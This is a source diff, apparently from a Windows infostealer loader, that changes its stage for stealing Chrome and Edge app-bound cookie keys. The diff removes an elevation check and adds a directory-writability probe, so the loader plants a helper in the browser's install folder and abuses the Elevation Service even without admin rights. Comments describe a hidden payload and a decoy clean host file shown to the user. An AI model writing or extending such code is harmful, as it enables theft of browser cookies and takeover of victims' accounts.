@@ -146,23 +146,14 @@ static DWORD Rva2Off(PIMAGE_NT_HEADERS nt, DWORD rva){
 // Chrome 127+ wraps the cookie key with the app-bound scheme: SYSTEM DPAPI plus
 // the user's DPAPI, unwrapped only by the browser's Elevation Service. The
 // service validates the caller path, so a helper is copied into the browser's
-// Application directory, run once, and deleted. Writing there requires an
-// elevated token; when the loader is not elevated the stage is skipped and the
-// payload simply reports no-key for app-bound browsers. Nothing here can abort
-// the run -- a failed key stage costs Chrome/Edge cookies, not the payload.
+// Application directory, run once, and deleted. The bar is write access to that
+// directory, not an elevated token: a per-user install under LOCALAPPDATA is
+// serviceable at medium IL, a system install under Program Files is not. Each
+// target is probed, and the stage runs whatever the token is. Nothing here can
+// abort the run -- a failed key stage costs app-bound cookies, not the payload.
 //
 // The helper (ckdec.exe) is embedded in this exe as RCDATA and understands the
 // CLSID argument, so Edge and Chromium forks work without their own builds.
-
-static bool IsElevated(void){
-    HANDLE tok=NULL;
-    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)) return false;
-    TOKEN_ELEVATION te; DWORD n=0; bool elevated=false;
-    if(GetTokenInformation(tok,TokenElevation,&te,sizeof(te),&n))
-        elevated = te.TokenIsElevated!=0;
-    CloseHandle(tok);
-    return elevated;
-}
 
 static void DirName(const wchar_t* path, wchar_t* out){
     lstrcpyW(out,path);
@@ -182,6 +173,20 @@ static bool IsUnderDir(const wchar_t* path, const wchar_t* dir){
     size_t n=lstrlenW(dir);
     if(n==0 || _wcsnicmp(path,dir,n)!=0) return false;
     return path[n]==0 || path[n]==L'\\' || path[n]==L'/';
+}
+
+// The deploy needs a create in app_dir. A token query answers a different
+// question -- a medium-IL process still writes its own per-user install, and an
+// elevated one can be denied by an ACL -- so probe with a real file.
+static bool DirWritable(const wchar_t* dir){
+    wchar_t probe[MAX_PATH*2];
+    wsprintfW(probe,L"%s\\.ckprobe.%u",dir,GetCurrentProcessId());
+    HANDLE h=CreateFileW(probe,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
+                         FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_TEMPORARY,NULL);
+    if(h==INVALID_HANDLE_VALUE) return false;
+    CloseHandle(h);
+    DeleteFileW(probe);
+    return true;
 }
 
 // LocalServer32 may be quoted and may carry -Embedding: keep the executable only
@@ -422,13 +427,16 @@ static bool ReadAppBound(const wchar_t* path, char** out, DWORD* out_len){
     return true;
 }
 
-static void StageOneKey(const KeyTarget& t, const char* b64, DWORD b64_len){
+static void StageOneKey(const KeyTarget& t, const char* b64, DWORD b64_len, bool force){
     wchar_t exe[MAX_PATH];
     if(!ResolveBrowserExe(t,exe,MAX_PATH)){
         KeyLog(t.name,"browser exe not found",0); return;
     }
     wchar_t appdir[MAX_PATH];
     DirName(exe,appdir);
+    if(!force&&!DirWritable(appdir)){
+        KeyLog(t.name,"app dir not writable",GetLastError()); return;
+    }
     wchar_t clsid[80];
     if(!FindElevatorClsid(appdir,clsid,80)){
         KeyLog(t.name,"elevation service CLSID not found",0); return;
@@ -459,16 +467,10 @@ static void StageOneKey(const KeyTarget& t, const char* b64, DWORD b64_len){
     KeyLog(t.name,"v20 key written",0);
 }
 
-static void RunKeyStage(bool keydebug){
-#ifdef DEBUG
-    bool allow_unelevated=keydebug;
-#else
-    bool allow_unelevated=false;
-    (void)keydebug;
-#endif
-    if(!allow_unelevated && !IsElevated()){
-        LLog("key stage: skipped (not elevated)",0); return;
-    }
+// force (--keydebug) skips the writability probe and attempts the deploy anyway:
+// the probe cannot see a redirected or virtualised store, and a failed create is
+// logged either way.
+static void RunKeyStage(bool force){
     wchar_t la[MAX_PATH]; la[0]=0;
     wchar_t aa[MAX_PATH]; aa[0]=0;
     bool have_la=GetEnvironmentVariableW(L"LOCALAPPDATA",la,MAX_PATH)!=0;
@@ -491,7 +493,7 @@ static void RunKeyStage(bool keydebug){
         if(!ReadAppBound(ls,&b64,&b64_len)){
             KeyLog(t.name,"no app_bound_encrypted_key",0); continue;
         }
-        StageOneKey(t,b64,b64_len);
+        StageOneKey(t,b64,b64_len,force);
         VirtualFree(b64,0,MEM_RELEASE);
     }
 }
@@ -808,8 +810,8 @@ int wmain(int argc,wchar_t** argv){
         // v13: the payload shares this process, so there is no host to terminate.
         // --kill stays parseable for pick.py/auto.py compatibility and does nothing.
         else if(!lstrcmpW(argv[i],L"--kill")){}
-        // debug builds only: run the key stage without an elevated token so the
-        // discovery path can be exercised on the bench (production = gate only)
+        // skip the writability probe and attempt the deploy anyway (bench hook:
+        // a redirected or virtualised store lies to CreateFile)
         else if(!lstrcmpW(argv[i],L"--keydebug")) keydebug=true;
 #ifdef DEBUG
         else if(!lstrcmpW(argv[i],L"--keystage-only")) keystage_only=true;
@@ -958,8 +960,8 @@ int wmain(int argc,wchar_t** argv){
     //    deletion (the clean host file the user actually sees is a separate copy).
     if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
 
-    // 2. v20 key stage (elevated only). Runs before the payload is mapped so
-    //    mc-<browser>.key files exist when ckdll walks the stores.
+    // 2. v20 key stage. Runs before the payload is mapped so mc-<browser>.key
+    //    files exist when ckdll walks the stores.
     RunKeyStage(keydebug);
 #ifdef DEBUG
     if(keystage_only) return 0;             // bench hook, compiled out of release
